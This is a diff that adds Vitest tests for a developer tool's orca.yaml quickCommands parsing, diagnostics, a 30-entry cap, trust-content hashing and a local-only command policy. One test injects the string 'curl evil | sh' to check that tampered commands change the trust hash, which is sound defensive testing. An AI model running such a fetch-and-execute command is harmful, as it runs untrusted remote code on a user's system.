@@ -2,9 +2,16 @@
 import type { Repo } from '../shared/types'
 import type * as GitRunner from './git/runner'
 
+import { createHash } from 'node:crypto'
 import { join } from 'node:path'
 import { describe, expect, it, vi } from 'vitest'
-import { getDefaultTabsLaunch, getEffectiveHooksFromConfig, parseOrcaYaml } from './hooks'
+import {
+  canRunSharedCommandsForRepo,
+  getDefaultTabsLaunch,
+  getEffectiveHooksFromConfig,
+  getSharedCommandTrustContent,
+  parseOrcaYaml
+} from './hooks'
 
 // Mock fs and path used by loadHooks
 vi.mock('fs', () => ({
@@ -384,7 +391,10 @@ describe('hasUnrecognizedOrcaYamlKeys', () => {
         'environmentRecipes:',
         '  - id: cloud-sandbox',
         '    name: Cloud Sandbox',
-        '    create: ./scripts/orca-vm/start-cloud-sandbox.sh'
+        '    create: ./scripts/orca-vm/start-cloud-sandbox.sh',
+        'quickCommands:',
+        '  - label: Dev server',
+        '    command: npm run dev'
       ].join('\n')
     )
 
@@ -1350,5 +1360,105 @@ describe('getDefaultTabsLaunch', () => {
       tabs: hooks.defaultTabs,
       runCommands: false
     })
+  })
+})
+
+describe('parseOrcaYaml quickCommands (#8481)', () => {
+  it('parses quickCommands terminal and agent variants and drops incomplete entries', () => {
+    const yaml = [
+      'quickCommands:',
+      '  - label: Dev server',
+      '    command: npm run dev',
+      '  - label: Insert only',
+      '    command: git status',
+      '    appendEnter: false',
+      '  - label: Investigate',
+      '    action: agent-prompt',
+      '    agent: claude',
+      '    prompt: Investigate the current branch',
+      '  - label: Missing command',
+      '  - command: no label here',
+      '  - label: Bad action',
+      '    action: mystery',
+      '    command: echo hi'
+    ].join('\n')
+
+    const result = parseOrcaYaml(yaml)
+    expect(result?.quickCommands).toEqual([
+      { label: 'Dev server', command: 'npm run dev' },
+      { label: 'Insert only', command: 'git status', appendEnter: false },
+      {
+        label: 'Investigate',
+        action: 'agent-prompt',
+        agent: 'claude',
+        prompt: 'Investigate the current branch'
+      }
+    ])
+    expect(result?.quickCommandDiagnostics).toEqual([
+      { index: 3, field: 'command', message: expect.stringContaining('Missing command') },
+      { index: 4, field: 'label', message: expect.stringContaining('label is required') },
+      { index: 5, field: 'action', message: expect.stringContaining('unknown action') }
+    ])
+  })
+
+  it('parses an orca.yaml containing only quickCommands', () => {
+    const yaml = 'quickCommands:\n  - label: Dev\n    command: npm run dev\n'
+    expect(parseOrcaYaml(yaml)).toEqual({
+      scripts: {},
+      quickCommands: [{ label: 'Dev', command: 'npm run dev' }]
+    })
+  })
+
+  it('caps quickCommands and reports diagnostics for the overflow', () => {
+    const entries = Array.from(
+      { length: 33 },
+      (_, index) => `  - label: Command ${index}\n    command: echo ${index}`
+    )
+    const result = parseOrcaYaml(`quickCommands:\n${entries.join('\n')}`)
+    expect(result?.quickCommands).toHaveLength(30)
+    expect(result?.quickCommandDiagnostics).toEqual([
+      { index: 30, message: expect.stringContaining('capped at 30') }
+    ])
+  })
+
+  it('quick command text changes the shared trust content hash', () => {
+    const base = 'scripts:\n  setup: npm install\nquickCommands:\n  - label: Dev\n'
+    const hooksA = parseOrcaYaml(`${base}    command: npm run dev\n`)
+    const hooksB = parseOrcaYaml(`${base}    command: npm run dev && curl evil | sh\n`)
+
+    const contentA = getSharedCommandTrustContent(hooksA)
+    const contentB = getSharedCommandTrustContent(hooksB)
+    expect(contentA).toContain('# quickCommands[1] Dev')
+    const hashOf = (content: string): string =>
+      createHash('sha256').update(content).digest('hex')
+    expect(hashOf(contentA)).not.toEqual(hashOf(contentB))
+  })
+
+  it('swapping the agent of an agent-prompt quick command changes the trust content', () => {
+    const yamlFor = (agent: string): string =>
+      `quickCommands:\n  - label: Ask\n    action: agent-prompt\n    agent: ${agent}\n    prompt: Review this\n`
+    expect(getSharedCommandTrustContent(parseOrcaYaml(yamlFor('claude')))).not.toEqual(
+      getSharedCommandTrustContent(parseOrcaYaml(yamlFor('codex')))
+    )
+  })
+
+  it('local-only command source policy suppresses orca.yaml quick commands', () => {
+    const makeRepo = (commandSourcePolicy?: string): Repo =>
+      ({
+        id: 'test-id',
+        path: '/test/repo',
+        displayName: 'Test Repo',
+        badgeColor: '#000',
+        addedAt: Date.now(),
+        hookSettings: {
+          mode: 'auto',
+          commandSourcePolicy,
+          scripts: { setup: 'echo local', archive: '' }
+        }
+      }) as unknown as Repo
+
+    expect(canRunSharedCommandsForRepo(makeRepo('local-only'))).toBe(false)
+    expect(canRunSharedCommandsForRepo(makeRepo('shared-only'))).toBe(true)
+    expect(canRunSharedCommandsForRepo(makeRepo('run-both'))).toBe(true)
   })
 })
